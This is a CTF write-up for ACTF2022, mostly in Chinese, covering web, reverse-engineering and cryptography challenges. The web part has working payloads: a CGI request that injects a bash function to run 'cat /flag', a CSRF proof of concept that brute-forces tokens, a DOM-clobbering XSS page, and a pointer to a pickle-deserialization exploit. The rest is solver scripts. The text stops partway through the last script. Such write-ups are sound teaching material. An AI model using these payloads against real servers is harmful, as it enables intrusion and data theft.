# ACTF2022

# WEB

## gogogo 

```HTTP
POST /cgi-bin/hello HTTP/1.1
Host: 123.60.84.229:10218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Origin: null
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Content-Length: 15460
Content-Type: multipart/form-data; boundary=2e754279fe56e0163ab4b1611ac442c4

--2e754279fe56e0163ab4b1611ac442c4
Content-Disposition: form-data; name="BASH_FUNC_env%%"

() { cat /flag; }
```

## TLS 

https://blog.zeddyu.info/2021/05/19/tls-ctf/#hxp-ctf---security-scanner

找着solution2打就行了，把pickle反序列化数据插入到redis，然后被TLS转发到靶机上面的mem数据库，然后带着sessionid访问触发就行。exp就用`curl_exp.py`。

## beWhatYouWannaBe 

第一部分是CRLF

```HTML
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->

<body>
        <script>
  function SHA256(s) {
  const chrsz = 8
  const hexcase = 0

  function safe_add(x, y) {
    const lsw = (x & 0xFFFF) + (y & 0xFFFF)
    const msw = (x >> 16) + (y >> 16) + (lsw >> 16)
    return (msw << 16) | (lsw & 0xFFFF)
  }

  function S(X, n) {
    return (X >>> n) | (X << (32 - n))
  }

  function R(X, n) {
    return (X >>> n)
  }

  function Ch(x, y, z) {
    return ((x & y) ^ ((~x) & z))
  }

  function Maj(x, y, z) {
    return ((x & y) ^ (x & z) ^ (y & z))
  }

  function Sigma0256(x) {
    return (S(x, 2) ^ S(x, 13) ^ S(x, 22))
  }

  function Sigma1256(x) {
    return (S(x, 6) ^ S(x, 11) ^ S(x, 25))
  }

  function Gamma0256(x) {
    return (S(x, 7) ^ S(x, 18) ^ R(x, 3))
  }

  function Gamma1256(x) {
    return (S(x, 17) ^ S(x, 19) ^ R(x, 10))
  }

  function core_sha256(m, l) {
    const K = [0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5, 0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3, 0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174, 0xE49B69C1, 0xEFBE4786, 0xFC19DC6, 0x240CA1CC, 0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA, 0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7, 0xC6E00BF3, 0xD5A79147, 0x6CA6351, 0x14292967, 0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13, 0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85, 0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3, 0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070, 0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5, 0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3, 0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208, 0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2]
    const HASH = [0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A, 0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19]
    const W = new Array(64)
    let a, b, c, d, e, f, g, h, i, j
    let T1, T2
    m[l >> 5] |= 0x80 << (24 - l % 32)
    m[((l + 64 >> 9) << 4) + 15] = l
    for (i = 0; i < m.length; i += 16) {
      a = HASH[0]
      b = HASH[1]
      c = HASH[2]
      d = HASH[3]
      e = HASH[4]
      f = HASH[5]
      g = HASH[6]
      h = HASH[7]
      for (j = 0; j < 64; j++) {
        if (j < 16) {
          W[j] = m[j + i]
        } else {
          W[j] = safe_add(safe_add(safe_add(Gamma1256(W[j - 2]), W[j - 7]), Gamma0256(W[j - 15])), W[j - 16])
        }
        T1 = safe_add(safe_add(safe_add(safe_add(h, Sigma1256(e)), Ch(e, f, g)), K[j]), W[j])
        T2 = safe_add(Sigma0256(a), Maj(a, b, c))
        h = g
        g = f
        f = e
        e = safe_add(d, T1)
        d = c
        c = b
        b = a
        a = safe_add(T1, T2)
      }
      HASH[0] = safe_add(a, HASH[0])
      HASH[1] = safe_add(b, HASH[1])
      HASH[2] = safe_add(c, HASH[2])
      HASH[3] = safe_add(d, HASH[3])
      HASH[4] = safe_add(e, HASH[4])
      HASH[5] = safe_add(f, HASH[5])
      HASH[6] = safe_add(g, HASH[6])
      HASH[7] = safe_add(h, HASH[7])
    }
    return HASH
  }

  function str2binb(str) {
    const bin = []
    const mask = (1 << chrsz) - 1
    for (let i = 0; i < str.length * chrsz; i += chrsz) {
      bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (24 - i % 32)
    }
    return bin
  }

  function Utf8Encode(string) {
    string = string.replace(/\r\n/g, '\n')
    let utfText = ''
    for (let n = 0; n < string.length; n++) {
      const c = string.charCodeAt(n)
      if (c < 128) {
        utfText += String.fromCharCode(c)
      } else if ((c > 127) && (c < 2048)) {
        utfText += String.fromCharCode((c >> 6) | 192)
        utfText += String.fromCharCode((c & 63) | 128)
      } else {
        utfText += String.fromCharCode((c >> 12) | 224)
        utfText += String.fromCharCode(((c >> 6) & 63) | 128)
        utfText += String.fromCharCode((c & 63) | 128)
      }
    }
    return utfText
  }

  function binb2hex(binarray) {
    const hex_tab = hexcase ? '0123456789ABCDEF' : '0123456789abcdef'
    let str = ''
    for (let i = 0; i < binarray.length * 4; i++) {
      str += hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8 + 4)) & 0xF) +
        hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8)) & 0xF)
    }
    return str
  }

  s = Utf8Encode(s)
  return binb2hex(core_sha256(str2binb(s), s.length * chrsz))
}
            </script>
<form name=dem0 action="http://localhost:8000/beAdmin" method="POST" target="_blank">
        <input type="hidden" name="username" value="dem0" />
        <input type="hidden"  name="csrftoken" value="111" />
        <input type="submit" name="submit requets">
</form>
<script>
      var tmp =  Date.now();
      for (var i = 0; i <= 100; i++) {
        var token = SHA256(Math.sin(Math.floor((tmp+2) / 1000)).toString())
        document.dem0.csrftoken.value=token
        document.dem0.submit()
      }
</script>
</body>


</html>
```

注册一个dem0用户，然后把这个放到靶机上面，访问，多访问几次，因为可能token爆破失败。然乎之间访问flag路由。

第二段是：[使用 Dom Clobbering 扩展 XSS](https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/)

直接抄payload

```HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>exp</title>
</head>
<body>
    <iframe name=fff srcdoc="
<iframe srcdoc='<input id=aaa name=ggg  value=this_is_what_i_want>test</a><input id=aaa>' name=lll>"></iframe>
<style>@import 'http://example.com';</style>
</body>

</html>
```

## poorui

非预期。直接admin登录上去 发个包就行了？

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQ3ZDRjNDU3N2I3N2FiMTE5MDI5YmE0NjE2NzliOWZfYVdBZVlxUjZxVnlRd3RFREpEaThzVWFEczExSmkzT1BfVG9rZW46Ym94Y25ZaFR0eWlxUngwVm9HcThpWGNQcEVoXzE2NTYzNzQ2NTc6MTY1NjM3ODI1N19WNA)



![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQwYzUyYzk1Mzg1OGFlOWRjMTU2ZTcyMGIyZjY2ZmVfS2ttdElob1VCMkJHWTZac3cyam1nb0NCUDJiWmJQZ05fVG9rZW46Ym94Y251eXI3SW5JYmZNVlgzQlU5NW85WVJmXzE2NTYzNzQ2NTc6MTY1NjM3ODI1N19WNA)



# Reverse

## kcov

rootfs 解包出来看 init，也就是简单运行了一个 kcov 可执行文件，拖入 ida 分析并还原 main 函数符号

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjc2MjFiYTc5YmM4MmRlYzg5N2UwNGVkMGMxMDgzNGVfWm9mYVE3YmxuNGJ6RVRyTzZQUVIxQlBna2ZzRHRFRlJfVG9rZW46Ym94Y25FbXl2aDNRWjBKUFZGR0RQaExsQ1diXzE2NTYzNzQ2NTc6MTY1NjM3ODI1N19WNA)

程序一开始用 kcov 这个驱动监测系统调用行为，并填充 key 数组。最后调用 check 函数对 key 进行校验，如果正确则输出 flag：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0ZTBiNGQxMjk4YzE2MGMzM2ZlODE1MjhiMDc5YjhfdjcwRmNWdE1laDdpdndqeUdpZlI3MllqcDNsSmRLYktfVG9rZW46Ym94Y25CS2JHU0o4dE1FN1lYdEpsYm9RS2tlXzE2NTYzNzQ2NTc6MTY1NjM3ODI1N19WNA)

但是 kcov 的部分过于随机，很难得到期望的 key 数组，所以题意是要让逆向 check 函数来直接还原 flag。该函数中主要通过 is_key_valid 来检查 key 的合法性：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=YmMxYWVhYjAyODQ1YWE0ZTYwNmFiYzBjOTE1MzE0ODZfeW5oVzY2V0QyS2hwUzlCZEQ0YnlCTWFGVlBOYVdaTVRfVG9rZW46Ym94Y25LS0I5MjdVN3B5MWZXcW40b0h5Y3VxXzE2NTYzNzQ2NTc6MTY1NjM3ODI1N19WNA)

上述代码将转换成矩阵的 key 与已知矩阵在模 91 的多项式域上进行乘法运算，结果存在 multi_result 数组中，该矩阵的对角线必须全为 1（猜测是单位矩阵）。只需要将 matrix 矩阵的所有元素转化到域上，再求逆即可，sage 代码如下：

```Python
A=[[44, 4, 23, 13], [2, 45, 57, 51], [7, 22, 52, 24], [29, 26, 11, 40]]

PolyField.<x> = GF(64, modulus=[1,1,0,1,1,0,1])


B=[[0 for i in range(4)] for j in range(4)]
for i in range(4):
    for j in range(4):
        B[i][j]=PolyField.fetch_int(A[i][j])
    
M = matrix(PolyField,B)
Key = M.inverse().T

print(Key)
```

将得到的 Key 从域上转化为 int，即可获得 key 数组，再手动 aes 解密得到 flag

```Python
from Crypto.Cipher import AES

key = [0, 21, 10, 6, 5, 8, 6, 7, 5, 9, 12, 12, 14, 1, 3, 4]
cipher = [
  0x9E, 0x69, 0x36, 0x12, 0x7B, 0xB0, 0x04, 0x4D,
  0xB9, 0x2A, 0x13, 0x6E, 0x37, 0xD1, 0xD6, 0x20,
  0xA5, 0x2B, 0xB8, 0xA2, 0x9A, 0x92, 0xA2, 0x24,
  0x9F, 0x38, 0x39, 0xFF, 0x55, 0x66, 0x6D, 0xCE,
  0x39, 0xEA, 0x75, 0x3C, 0x32, 0x45, 0xF3, 0x67,
  0x84, 0x8E, 0x49, 0x7B, 0xB8, 0xAA, 0x6B, 0x1F,
  0x55, 0xFC, 0x96, 0x1E, 0x77, 0x90, 0x3D, 0xB4,
  0xCB, 0x69, 0x3E, 0xF9, 0x2B, 0x38, 0x9E, 0x76,
  0x6D, 0xB0, 0xC9, 0x9F, 0x29, 0x2D, 0x0B, 0xE7,
  0x0C, 0xED, 0x8D, 0x28, 0x47, 0x8C, 0x5E, 0xCD
]

aes = AES.new(bytes(key), AES.MODE_ECB)
flag = aes.decrypt(bytes(cipher)).rstrip(b'\x00').decode()
print(flag)
# ACTF{YOU_dOn_No7_R3ALly_neED_t0_Co1LeC7_KC0v_$INcE_1T_i5_UN$7@ble}
```



# Crypto

## Impossilble RSA

推导如下：

​                                                    $$q \equiv e^{-1} mod \ p$$ 

​                                                    $$eq-1=kp$$

注意到p,q差不多大，所以e,k也差不多大，爆破k，对于每一个k，我们有如下条件：

​                                                   $$eq-kp=1$$

​                                                     $$pq=n$$

因此-kp,eq为下列方程的两个根：

​                                                    $$x^2-x-ken=0$$

解上面的二次方程，求出-kp,eq除去系数，得到p,q，分解n，求出flag。

```Python
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
from gmpy2 import *
from math import *
def solve(a,b,c):
    delta=b*b-4*a*c
    if delta<0:
        return (0,0)
    delta=isqrt(delta)
    if (-b+delta)%(2*a)!=0 or (-b-delta)%(2*a)!=0:
        return (0,0)
    return ((-b+delta)//(2*a),(-b-delta)//(2*a))

with open("public.pem","rb") as f:
    data=f.read()
with open("flag","rb") as f:
    tmp=bytes_to_long(f.read())
key=RSA.import_key(data)
e=key.e
n=key.n
pq=[]
for k in range(1,e+1):
    b=-1
    c=-k*e*n
    x0,x1=solve(1,b,c)
    if x0!=0 and x1!=0 and (x0%e==0 or x1%e==0):
        if x0%e==0:
            p=x0//e
            pq.append(p)
        else:
            p=x1//e
            pq.append(p)

for i in pq:
    if n%i==0:
        p=i
        break
q=n//p
n=p*q
phi=(p-1)*(q-1)
e=65537
d=invert(e,phi)
print(long_to_bytes(powmod(tmp,d,n)))
#b'ACTF{F1nD1nG_5pEcia1_n_i5_nOt_eA5y}'
```

## RSA LEAK

第二个n可以拿到factordb去分解，因此可以通过leak来解出rp，rq

遍历rp的范围依次得到rq的值，筛选出24bit内的可能值

因为p和q是1024bit的，远大于rp和rq，且p和q都是某个数的4次方

$$(a^4+rq)(b^4+rp)=n$$

$$ab = n^{\frac{1}{4}}$$

联立可分别解出a和b的值，代入得到p和q

```Apache
from gmpy2 import *
from Crypto.Util.number import *
def solve(a,b,c):
    delta=b*b-4*a*c
    if delta<0:
        return (0,0)
    delta=isqrt(delta)
    if (-b+delta)%(2*a)!=0 and (-b-delta)%(2*a)!=0:
        return (0,0)
    return ((-b+delta)//(2*a),(-b-delta)//(2*a))

e=65537
c1=90846368443479079691227824315092288065
c=0xdeadbeef
p1=8949458376079230661
q1=13648451618657980711
n1=122146249659110799196678177080657779971
n=3183573836769699313763043722513486503160533089470716348487649113450828830224151824106050562868640291712433283679799855890306945562430572137128269318944453041825476154913676849658599642113896525291798525533722805116041675462675732995881671359593602584751304602244415149859346875340361740775463623467503186824385780851920136368593725535779854726168687179051303851797111239451264183276544616736820298054063232641359775128753071340474714720534858295660426278356630743758247422916519687362426114443660989774519751234591819547129288719863041972824405872212208118093577184659446552017086531002340663509215501866212294702743
phi=(p1-1)*(q1-1)
d=invert(e,phi)
enc=48433948078708266558408900822131846839473472350405274958254566291017137879542806238459456400958349315245447486509633749276746053786868315163583443030289607980449076267295483248068122553237802668045588106193692102901936355277693449867608379899254200590252441986645643511838233803828204450622023993363140246583650322952060860867801081687288233255776380790653361695125971596448862744165007007840033270102756536056501059098523990991260352123691349393725158028931174218091973919457078350257978338294099849690514328273829474324145569140386584429042884336459789499705672633475010234403132893629856284982320249119974872840

for rp in range(1,2**24+10000):
    rq=pow((((c1-c)-pow(rp,e,n1)))%n1,d,n1)
    if len(bin(rq))-2<=25:
        print(rp)
        print(rq)
        break

rq=11974933
rp=405771
print((pow(rp,e,n1)+pow(rq,e,n1)+c)%n1==c1)

ji=iroot(n,4)[0]
tmp=n-rp*rq-ji**4

a=rp
b=-tmp
c=(ji**4)*rq
b1,b2=solve(a,b,c)
b1=iroot(b1,4)
b2=iroot(b2,4)
if b1[1]==True:
    b=b1[0]
else:
    b=b2[0]
a=ji//b
p=a**4+rp
q=b**4+rq
phi=(p-1)*(q-1)
d=invert(65537,phi)
print(long_to_bytes(pow(enc,d,n)))
#405771
#11974933
#True
#b'ACTF{lsb_attack_in_RSA|a32d7f}'
```

## secure connection 

整体上来说是一个master和slave的对话。master发消息的特征是先发一个包含是否加密和是否还有待发送消息信息的字节，再发一个包含消息数信息的字节，之后就是一段加密的话，结尾附带上三个CRC校验字节；slave发消息的特征与master大同小异。根据master_hello和slave_hello的流程，依次调用不同的函数。每次根据第一个字节获取加密信息，再根据对应信息对信息处理，逐句翻译之后，根据结尾的CRC校验字节判断翻译是否正确，直到把所有对话翻译过来。

```Python
import libscrc
from Crypto.Util.number import *
from Crypto.Cipher import AES
import base64
def crc(x,Init):
    initvalue=int.from_bytes(Init,"little")
    crc=libscrc.hacker24(data=x,poly=0x00065B,init=initvalue,xorout=0x00000000,refin=True,refout=True)
    return crc.to_bytes(3,"little")

def dump(x):
    try:
        res=long_to_bytes(int(x,16))
    except:
        res=b' '
    return res
def dump_str(x):
    res=b''
    x=x.split()
    for i in x:
        res+=dump(i)
    return res

def secure_encrypt(key, plain):
    aes = AES.new(key=key, mode=AES.MODE_ECB)
    return aes.encrypt(plain)

def secure_confirm(key, r, p1, p2):
    return secure_encrypt(key, bytes_xor_16(secure_encrypt(key, bytes_xor_16(r, p1)), p2))


def bytes_xor_16(bytes1, bytes2):
    v1 = int.from_bytes(bytes1, 'big')
    v2 = int.from_bytes(bytes2, 'big')
    v3 = v1 ^ v2
    return (v3).to_bytes(16, 'big')

def secure_encrypt_packet(key, plain, nonce):
    aes = AES.new(key=key, mode=AES.MODE_CCM, nonce=nonce)
    return aes.encrypt(plain)

def secure_decrypt_packet(key, plain, nonce):
    aes = AES.new(key=key, mode=AES.MODE_CCM, nonce=nonce)
    return aes.decrypt(plain)


encrypt=0
hello_packet = b""
hello_packet += int(encrypt << 7 |(1 & 0x3f)).to_bytes(1, "little")
hello_packet += int(3).to_bytes(1, "little")
Init=dump('6c')+dump('69')+dump('fa')
hello_packet=hello_packet+Init
hello_packet+=crc(hello_packet,Init)
#print(hello_packet)


moredata=0

data_packet = b""
encrypt=0
data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
#print("data_packet:",data_packet)
datalen=bytes_to_long(dump('30'))
#print(datalen)
data_packet += datalen.to_bytes(1, "little")
data='53 47 56 73 62 47 38 67 64 47 68 6c 63 6d 55 73 49 47 78 76 62 6d 63 67 64 47 6c 74 5a 53 42 75 62 79 42 7a 5a 57 55 73 49 48 70 79 59 58 68 34'
data=dump_str(data)
#print("data:",data)
data_packet+=data
#Hello there, long time no see, zraxx
data_packet+=crc(data_packet,Init)
#print("data_packet:",data_packet)
#print(data_packet)

dataheader='08 44'
dataheader=dump_str(dataheader)
more_data = (dataheader[0] >> 6) & 0b1
opcode = dataheader[0] & 0x3f
datalength = dataheader[1]
payload='65 57 56 68 61 43 77 67 53 53 42 68 62 53 42 78 64 57 6c 30 5a 53 42 69 64 58 4e 35 49 47 31 68 61 32 6c 75 5a 79 42 42 51 31 52 47 49 47 4e 79 65 58 42 30 62 79 42 6a 61 47 46 73 62 47 56 75 5a 32 56 7a'
payload=dump_str(payload)
CRC='ab 08 96'
#print(payload)
##payload-base64:yeah, I am quite busy making ACTF crypto challenges

data_packet = b""
encrypt=0
data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
#print("data_packet:",data_packet)
datalen=bytes_to_long(dump('40'))
#print(datalen)
data_packet += datalen.to_bytes(1, "little")
data='64 32 56 73 62 43 77 67 53 53 42 6a 59 57 34 67 62 32 5a 6d 5a 58 49 67 65 57 39 31 49 47 45 67 62 6d 39 30 49 47 4a 68 5a 43 42 7a 61 57 64 75 61 57 34 67 59 32 68 68 62 47 78 6c 62 6d 64 6c'
data=dump_str(data)
#print("data:",data)
data_packet+=data
#well, I can offer you a not bad signin challenge

data_packet+=crc(data_packet,Init)
#print("data_packet:",data_packet)
#print(data_packet)


dataheader='08 0c'
dataheader=dump_str(dataheader)
more_data = (dataheader[0] >> 6) & 0b1
opcode = dataheader[0] & 0x3f
datalength = dataheader[1]
payload='63 32 68 76 64 79 42 74 5a 51 3d 3d '
payload=dump_str(payload)
CRC='06 eb 3b'
#print(payload)
#show me

data_packet = b""
encrypt=0
data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
#print("data_packet:",data_packet)
datalen=bytes_to_long(dump('34'))
#print(datalen)
data_packet += datalen.to_bytes(1, "little")
data='62 47 56 30 4a 33 4d 67 5a 6d 6c 79 63 33 51 67 5a 47 6c 32 5a 53 42 70 62 6e 52 76 49 48 4e 6c 59 33 56 79 5a 53 42 6a 62 32 35 75 5a 57 4e 30 61 57 39 75'
data=dump_str(data)
#print("data:",data)
data_packet+=data

#let's first dive into secure connection
data_packet+=crc(data_packet,Init)
#print("data_packet:",data_packet)
#print(data_packet)


encrypt=1
hello_packet = b""
hello_packet += int(encrypt << 7 |(1 & 0x3f)).to_bytes(1, "little")
#print(hello_packet)
hello_packet += int(3).to_bytes(1, "little")
Init=dump('6c')+dump('69')+dump('fa')
Init=dump_str('d9 b2 df')
hello_packet=hello_packet+Init
hello_packet+=crc(hello_packet,Init)
#print(hello_packet[0]&0x3f==1)
#print((hello_packet[0]>>7)&0b1)
#print(hello_packet)


sc_request_packet = b""           #prepare_sc_request
moredata=0
encrypt=1
sc_request_packet += int(encrypt << 7 | moredata << 6 |(2 & 0x3f)).to_bytes(1, "little")
#print("sc_request_packet:",sc_request_packet)
sc_request_packet += int(16).to_bytes(1, "little")
#print(sc_request_packet)
IV1='ec 36 e5 b0 69 55 d9 95'
IV1=dump_str(IV1)
secret1='56 7e e5 de 45 07 37 f8'
secret1=dump_str(secret1)
CRC='7d d5 57 '
Init=dump_str('d9 b2 df')
CRC=dump_str(CRC)
#print("CRC:",CRC)
sc_request_packet=sc_request_packet+IV1+secret1
sc_request_packet=sc_request_packet+crc(sc_request_packet,Init)
#print(sc_request_packet)


encrypt=1

sc_request_packet = b""            #prepare_sc_respond
sc_request_packet += int(encrypt << 7 |(3 & 0x3f)).to_bytes(1, "little")
#print(sc_request_packet[0]&0x3f)
sc_request_packet += int(16).to_bytes(1, "little")
#print(sc_request_packet)
IV2='68 b3 de d5 b8 40 14 dc'
IV2=dump_str(IV2)
Init=dump_str('d9 b2 df')
secret2='f3 fb 75 02 d9 39 0e 34'
secret2=dump_str(secret2)
CRC='a6 bf 63'
CRC=dump_str(CRC)
sc_request_packet=sc_request_packet+IV2+secret2

sc_request_packet=sc_request_packet+crc(sc_request_packet,Init)
#print(sc_request_packet)

master_confirm_packet = b""           #prepare_master_confirm

encrypt=1
master_confirm_packet += int(encrypt << 7 |(4 & 0x3f)).to_bytes(1, "little")
#print("master_confirm_packet:",master_confirm_packet)
master_confirm_packet += int(16).to_bytes(1, "little")
#print(master_confirm_packet)
msg='9f 51 36 ca cd 9f 2a 53 87 39 4b 7d 0c 1c'
Init=dump_str('d9 b2 df')
CRC_std='58 46 05'
CRC_std=dump_str(CRC_std)
'''
for i in range(256):
    for j in range(256):
        tmp=master_confirm_packet
        tmpmsg=msg+' '+hex(i)[2:].rjust(2,'0')+' '+hex(j)[2:].rjust(2,'0')
        tmpmsg=dump_str(tmpmsg)
        tmp+=tmpmsg
        CRC=crc(tmp,Init)
        if(CRC==CRC_std):
            print("tmpmsg:",tmpmsg)
            break
'''
MRandom='4b d2 09 24 f0 c3 cd 30 ba 64 a0 f1 d9 64 69 1e'
#tmpmsg: b'\x9fQ6\xca\xcd\x9f*S\x879K}\x0c\x1c\x16\xfa'
tmpmsg=b'\x9fQ6\xca\xcd\x9f*S\x879K}\x0c\x1c\x16\xfa'
MConfirm=tmpmsg



#slave confirm            
msg1=['85 10 ',' d6 e4 ',' 5c ',' b7 ba 90 6e 57 05 5a 8e c8 2d db b8 ']
#print(0x85&0x3f==5)
CRC_std='2d db b8'
CRC_std=dump_str(CRC_std)
'''
for a1 in range(256):
    for a2 in range(256):
        for a3 in range(256):
            for a4 in range(256):
                tmpmsg1=msg1[0]+hex(a1)[2:]+msg1[1]+hex(a2)[2:]+' '+hex(a3)[2:]+msg1[2]+hex(a4)[2:]+msg1[3]
                tmpmsg1=dump_str(tmpmsg1)
                CRC=crc(tmpmsg1[:18],Init)
                if CRC==CRC_std:
                    print(tmpmsg1)
                    break
'''
#tmpmsg1=b'\x85\x10\x00\xd6\xe4+\xf3\\\xec\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#tmpmsg1=b'\x85\x10\x00\xd6\xe4D\xb3\\\xbe\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#tmpmsg1=b'\x85\x10\x00\xd6\xe4\x9a3\\\x1a\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#tmpmsg1=b'\x85\x10\x00\xd6\xe4\xf5s\\H\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#tmpmsg1=b'\x85\x10\x01\xd6\xe47\xe3\\\x8b\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#tmpmsg1=b'\x85\x10\x01\xd6\xe4X\xa3\\\xd9\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#b'\x85\x10\x01\xd6\xe4\x86#\\}\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#b'\x85\x10\x01\xd6\xe4\xe9c\\/\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#b'\x85\x10\x02\xd6\xe4\x13\xd3\\"\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#b'\x85\x10\x02\xd6\xe4|\x93\\p\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'
#b'\x85\x10\x02\xd6\xe4\xa2\x13\\\xd4\xb7\xba\x90nW\x05Z\x8e\xc8-\xdb\xb8'



master_random_packet = b""

encrypt=1                 #master_random_packet
master_random_packet += int(encrypt << 7 |(6 & 0x3f)).to_bytes(1, "little")
master_random_packet += int(16).to_bytes(1, "little")
MRandom='4b d2 09 24 f0 c3 cd 30 ba 64 a0 f1 d9 64 69 1e'
MRandom=dump_str(MRandom)
master_random_packet+=MRandom
#print(crc(master_random_packet,Init))

'''
for key in range(0x1000000):
    p1=b"\x00" * 16
    p2=b"\xff" * 16
    key_bytes=key.to_bytes(16,"little")
    try:
        aes=AES.new(key=key_bytes,mode=AES.MODE_ECB)
        MRandom=bytes_xor_16(aes.decrypt(bytes_xor_16(aes.decrypt(tmpmsg),p2)),p1)
        if MRandom==dump_str('4b d2 09 24 f0 c3 cd 30 ba 64 a0 f1 d9 64 69 1e'):
            print("key:",key)
            break
    except:
        continue
'''
#slave random
key=9190693
key=key.to_bytes(16,"little")

slave_random_packet = b""
slave_random_packet += int(encrypt << 7 |(7 & 0x3f)).to_bytes(1, "little")
slave_random_packet += int(16).to_bytes(1, "little")
#master_confirm = secure_confirm(key.to_bytes(16,"little"), MRandom, b"\x00" * 16, b"\xff" * 16)
#aes=AES.new(key=key.to_bytes(16,"little"),mode=AES.MODE_ECB)
#recvSrandom=bytes_xor_16(aes.decrypt(bytes_xor_16(aes.decrypt(master_confirm),b"\xff" * 16)),b"\x00" * 16)
SRandom=['dd 76 51 4f 57 36 81 3a a8 c2 17 8e ',' f8 2d 5b ']
'''
for i in range(256):
    slavemsg=SRandom[0]+hex(i)[2:]+SRandom[1]
    slavemsg=dump_str(slavemsg)
    slavemsg=slave_random_packet+slavemsg
    if crc(slavemsg,Init)==dump_str('6f 68 ec'):
        print(slavemsg[2:])
        break
'''
#print(crc(slavemsg,Init))


SRandom=b'\xddvQOW6\x81:\xa8\xc2\x17\x8e|\xf8-['
SConfirm=secure_confirm(key,SRandom,b"\x00"*16,b"\xff"*16)
slave_confirm_packet = b""
slave_confirm_packet += int(encrypt << 7 |(5 & 0x3f)).to_bytes(1, "little")
slave_confirm_packet += int(16).to_bytes(1, "little")
slave_confirm_packet+=SConfirm
CRC=crc(slave_confirm_packet,Init)
slave_confirm_packet+=CRC
#print(slave_confirm_packet)


#check
#print(secure_confirm(key,SRandom,b"\x00"*16,b"\xff"*16)==SConfirm)
#true


#进入session
storekey=secure_encrypt(key,MRandom[:8]+SRandom[8:])
sessionkey=secure_encrypt(storekey,secret1+secret2)
'''
for local in range(30):
    encrypt=1
    moredata=0
    data_packet = b""
    data_packet += int(encrypt << 7 | moredata << 6 |(8 & 0x3f)).to_bytes(1, "little")
    #print(data_packet)
    datalength=0x44
    data_packet += datalength.to_bytes(1, "little")
    payload='ee 49 1a 84 62 41 16 fb 68 5e 5d 47 14 94 aa 6d 3e ac 7c 53 70 7c 46 50 50 90 7e a2 01 12 04 06 90 02 5e 92 a6 1d d8 29 1b 50 d0 c1 69 13 b9 cd 0f f5 29 0e da d9 c2 3d 69 38 46 49 76 5b 84 7f 15 f2 21 ce'
    msg=secure_decrypt_packet(sessionkey,dump_str(payload),local.to_bytes(13,"little"))
    try:
        msg=base64.b64decode(msg)
        print(msg)
        print("local:",local)
    except:
        continue
'''
local=4
#b'I will tell you my flag after you finish your poem'
#CRC_std='3e 4f b4'



dataheader='c8 ff '
dataheader=dump_str(dataheader)
datalength=0xff
